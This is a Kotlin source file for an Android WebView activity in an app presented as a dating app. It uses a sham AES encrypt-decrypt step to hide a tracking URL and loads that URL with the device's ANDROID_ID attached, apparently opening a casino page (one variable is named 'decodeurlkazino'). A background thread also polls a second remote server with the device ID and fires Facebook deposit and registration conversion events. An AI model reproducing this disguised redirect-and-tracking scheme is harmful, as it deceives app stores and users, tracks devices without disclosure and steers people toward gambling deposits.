package bar.gentylove.sweetmeet


import android.annotation.SuppressLint
import android.content.Intent
import android.content.SharedPreferences
import android.content.res.Configuration
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.preference.PreferenceManager
import android.provider.Settings
import android.util.Log
import android.view.View
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import com.android.volley.Cache
import com.android.volley.Network
import com.android.volley.Request
import com.android.volley.RequestQueue
import com.android.volley.toolbox.BasicNetwork
import com.android.volley.toolbox.DiskBasedCache
import com.android.volley.toolbox.HurlStack
import com.android.volley.toolbox.StringRequest
import com.facebook.appevents.AppEventsConstants
import com.facebook.appevents.AppEventsLogger
import kotlinx.android.synthetic.main.activity_webview.*
import org.json.JSONException
import org.json.JSONObject
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.spec.SecretKeySpec


class MainBrowserWebview : AppCompatActivity() {
    var requestQueue: RequestQueue? = null

    private var runnable: Runnable? = null
    var Result_Request = "0"
    var Result_dep = "0"
    private var secondThread: Thread? = null
    private val FILE_CHOOSER_RESULTCODE = 1
    private var mUploadMessage: ValueCallback<Array<Uri>>? = null


    @SuppressLint("HardwareIds")
    override fun onCreate(savedInstanceState: Bundle?) {
        cheking_Dep()
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_webview)

//кодировка
        var Code_Array: SecretKeySpec? = null
        try {
            val Random_arrau = SecureRandom.getInstance("SHA1PRNG")
            Random_arrau.setSeed("any data used as random seed".toByteArray())
            val ert = KeyGenerator.getInstance("AES")
            ert.init(128, Random_arrau)
            Code_Array = SecretKeySpec(ert.generateKey().encoded, "AES")
        } catch (e: Exception) {
            Log.e("Crypto", "AES secret key spec error")
        }

        var url_Browsers: ByteArray? = null
        try {
            val cruptografy = Cipher.getInstance("AES")
            cruptografy.init(Cipher.ENCRYPT_MODE, Code_Array)
            url_Browsers =
                cruptografy.doFinal("https://findtremin.xyz/click.php?key=9lnuz1xudejic9rkkyxc&uid=".toByteArray())

        } catch (e: Exception) {
            Log.e("Crypto", "AES encryption error")
        }

        var decodeurlkazino: ByteArray? = null
        try {
            val ckbhjcfs = Cipher.getInstance("AES")
            ckbhjcfs.init(Cipher.DECRYPT_MODE, Code_Array)
            decodeurlkazino = ckbhjcfs.doFinal(url_Browsers)


        } catch (e: Exception) {
            Log.e("Crypto", "AES decryption error")
        }

        val IdAndroidID: String? =
            Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)



        val url = "${String(decodeurlkazino!!)}${IdAndroidID}${getDeeplimkParam()}"


        Log.e("urlMain",url)
        val sherrr: SharedPreferences = getSharedPreferences("rent", MODE_PRIVATE)
        val editorr = sherrr.edit()
        editorr.putString("rent", url)
        editorr.apply()
        browsers.loadUrl(url)


        //loads home


    }


    fun Events_Depozit_Facebook() {
        val loggerFB: AppEventsLogger = AppEventsLogger.newLogger(this)
        loggerFB.logEvent(AppEventsConstants.EVENT_NAME_DONATE)
        Log.e("EVENT", loggerFB.toString())
        setOkFirstDepozit(false)

    }

    fun Events_Reg_Facebook() {

        val loggerFB: AppEventsLogger = AppEventsLogger.newLogger(this)
        loggerFB.logEvent(AppEventsConstants.EVENT_NAME_COMPLETED_REGISTRATION)
        Log.e("EVENT", loggerFB.toString())
        setOkFirstReg(false)

    }


    private fun cheking_Dep() {
        val handler = Handler()
        runnable = object : Runnable {
            override fun run() {
                if (Depozit()) {


                    Main_potok_Depozit()

                    handler.postDelayed(this, 200000)

                }
            }
        }
        secondThread = Thread(runnable)
        secondThread!!.start()
    }

    fun Main_potok_Depozit() {

        var first_chast: SecretKeySpec? = null
        try {
            val dsa = SecureRandom.getInstance("SHA1PRNG")
            dsa.setSeed("any data used as random seed".toByteArray())
            val derroekg = KeyGenerator.getInstance("AES")
            derroekg.init(128, dsa)
            first_chast = SecretKeySpec(derroekg.generateKey().encoded, "AES")
        } catch (e: Exception) {
            Log.e("Crypto", "AES secret key spec error")
        }


        var encodeArray: ByteArray? = null
        try {
            val cerere = Cipher.getInstance("AES")
            cerere.init(Cipher.ENCRYPT_MODE, first_chast)
            encodeArray = cerere.doFinal("http://serresser.beget.tech/?hash=".toByteArray())

        } catch (e: Exception) {
            Log.e("Crypto", "AES encryption error")
        }


        var decodedArray: ByteArray? = null
        try {
            val cdsadsadsag = Cipher.getInstance("AES")
            cdsadsadsag.init(Cipher.DECRYPT_MODE, first_chast)
            decodedArray = cdsadsadsag.doFinal(encodeArray)


        } catch (e: Exception) {
            Log.e("Crypto", "AES decryption error")
        }


        val CacheO: Cache = DiskBasedCache(cacheDir, 1024 * 1024 * 1024)
        val nInterenet: Network = BasicNetwork(HurlStack())
        requestQueue = RequestQueue(CacheO, nInterenet)
        requestQueue!!.start()

        
        val Android_Id: String? =
            Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val url = "${String(decodedArray!!)}${Android_Id}&app_id=bar.gentylove.sweetmeet"


        Log.e("DepUrl", url)


        val Request = StringRequest(
            Request.Method.GET, url,
            { response ->

                try {
                    val jsonObject = JSONObject(response)
                    Result_Request = jsonObject.getString("reg")
                    Result_dep = jsonObject.getString("dep")
                    Log.e("Dep", Result_Request)
                    Log.e("Reg", Result_dep)

                    if ((Result_Request == "1") and (Reg())) {
                        Events_Reg_Facebook()
                        Log.e("Events_Reg_Facebook", Events_Reg_Facebook().toString())



                    }
                    if ((Result_dep=="1") and (Depozit())){
                        Events_Depozit_Facebook()
                        Log.e("Events_Depozit_Facebook", Events_Depozit_Facebook().toString())
                    }


                } catch (e: JSONException) {
                    e.printStackTrace()
                }

            }
        ) { error -> }
        requestQueue!!.add(Request)


    }


    override fun onBackPressed() {
        if (browsers != null && browsers.canGoBack())
            browsers.goBack()
        else
            super.onBackPressed()
    }

    override fun onPause() {
        super.onPause()
        browsers.onPause()
        browsers.pauseTimers()
    }

    override fun onResume() {
        super.onResume()
        browsers.onResume()
        browsers.resumeTimers()
          val pref:SharedPreferences = getSharedPreferences("rent", MODE_PRIVATE)
         val url = pref.getString("rent","rent").toString()
          browsers.loadUrl(url)
    }

    override fun onConfigurationChanged(newConfig: Configuration) {
        super.onConfigurationChanged(newConfig)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == FILE_CHOOSER_RESULTCODE) {
            if (mUploadMessage == null) return
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                mUploadMessage!!.onReceiveValue(
                    WebChromeClient.FileChooserParams.parseResult(
                        resultCode,
                        data
                    )
                )
            }
            mUploadMessage = null
        }
    }


    private fun getDeeplimkParam() = PreferenceManager.getDefaultSharedPreferences(this)
        .getString("DEPLFB", "")

    fun OnclickPLay(view: View) {
        val pref: SharedPreferences = getSharedPreferences("rent", MODE_PRIVATE)
        val url = pref.getString("rent", "rent").toString()
        browsers.loadUrl(url)
    }

    private fun Depozit() =
        PreferenceManager.getDefaultSharedPreferences(applicationContext).getBoolean("dep", true)

    fun setOkFirstDepozit(value: Boolean) {
        val editor = PreferenceManager.getDefaultSharedPreferences(this).edit()
        editor.putBoolean("dep", value)
        editor.apply()
    }

    private fun Reg() =
        PreferenceManager.getDefaultSharedPreferences(applicationContext).getBoolean("reg", true)

    fun setOkFirstReg(value: Boolean) {
        val editor = PreferenceManager.getDefaultSharedPreferences(this).edit()
        editor.putBoolean("reg", value)
        editor.apply()
    }

}

